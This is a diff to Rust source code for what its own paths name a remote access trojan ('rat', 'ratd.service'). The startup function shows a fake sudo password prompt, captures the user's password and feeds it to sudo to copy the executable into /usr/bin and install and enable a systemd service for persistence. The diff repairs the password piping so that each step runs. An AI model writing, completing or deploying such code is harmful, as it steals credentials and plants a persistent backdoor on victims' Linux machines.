@@ -1,7 +1,6 @@
 use crate::extensions::Password;
 use std::{io::Write, path::PathBuf, process::Stdio};
 
-#[allow(unused)]
 pub fn startup() -> Password {
     // Need to be fixed:
     // Multiple sudo prompts
@@ -10,35 +9,38 @@ pub fn startup() -> Password {
         // grabbing the path of the current running executable
         let current_exe_path = std::env::current_exe().unwrap();
 
+        // creating a buffered writer for stdout
+        let mut out = std::io::BufWriter::new(std::io::stdout().lock());
+
         // copying the executable to the /usr/bin directory
         let pass = loop {
-            print!(
+            write!(
+                out,
                 "[sudo] enter password for {}: ",
                 std::env::var("USER").unwrap()
-            );
-            let _ = std::io::stdout().flush();
+            )
+            .unwrap();
+            let _ = out.flush();
 
             let mut pass = String::new();
             std::io::stdin().read_line(&mut pass).unwrap();
+            pass.pop();
 
             let mut child = std::process::Command::new("sudo")
                 .arg("-kS")
-                .args(["cp", current_exe_path.to_str().unwrap(), "/usr/games/hello"])
+                .args(["cp", current_exe_path.to_str().unwrap(), "/usr/bin/rat"])
                 .stdin(Stdio::piped())
                 .stderr(Stdio::null())
                 .spawn()
                 .unwrap();
 
-            match child.wait_with_output() {
-                Ok(op) => {
-                    if let Some(0) = op.status.code() {
-                        break pass;
-                    } else if let Some(1) = op.status.code() {
-                        println!("Sorry, try again.");
-                        continue;
-                    }
-                }
-                Err(e) => {
+            let _ = child.stdin.as_mut().unwrap().write_all(&pass.as_bytes());
+
+            if let Ok(op) = child.wait_with_output() {
+                if let Some(0) = op.status.code() {
+                    break pass;
+                } else if let Some(1) = op.status.code() {
+                    writeln!(out, "Sorry, try again.").unwrap();
                     continue;
                 }
             }
@@ -56,24 +58,29 @@ ExecStart=/usr/bin/rat
 WorkingDirectory=/var/rat/
 
 [Install]
-WantedBy=multi-user.target
-        ";
+WantedBy=multi-user.target\n";
 
         // creating service file
-        let mut child = std::process::Command::new("sudo")
-            .args(["touch", "/etc/systemd/system/ratd.service"])
+        let mut child1 = std::process::Command::new("sudo")
+            .args(["-kS", "touch", "/etc/systemd/system/ratd.service"])
             .stdin(Stdio::piped())
+            .stderr(Stdio::null())
             .spawn()
             .unwrap();
 
-        child.stdin.as_mut().unwrap().write_all(&service.as_bytes());
-        child.wait_with_output();
+        let _ = child1.stdin.as_mut().unwrap().write_all(&pass.as_bytes());
+        let _ = child1.wait_with_output();
 
         // enabling service file on startup
-        let _ = std::process::Command::new("sudo")
-            .args(["systemctl", "enable", "ratd.service"])
-            .output()
+        let mut child2 = std::process::Command::new("sudo")
+            .args(["-kS", "systemctl", "enable", "ratd.service"])
+            .stdin(Stdio::piped())
+            .stderr(Stdio::null())
+            .spawn()
             .unwrap();
+
+        let _ = child2.stdin.as_mut().unwrap().write_all(&pass.as_bytes());
+        let _ = child2.wait_with_output();
 
         return Password::new(pass);
     } else if cfg!(target_os = "windows") {
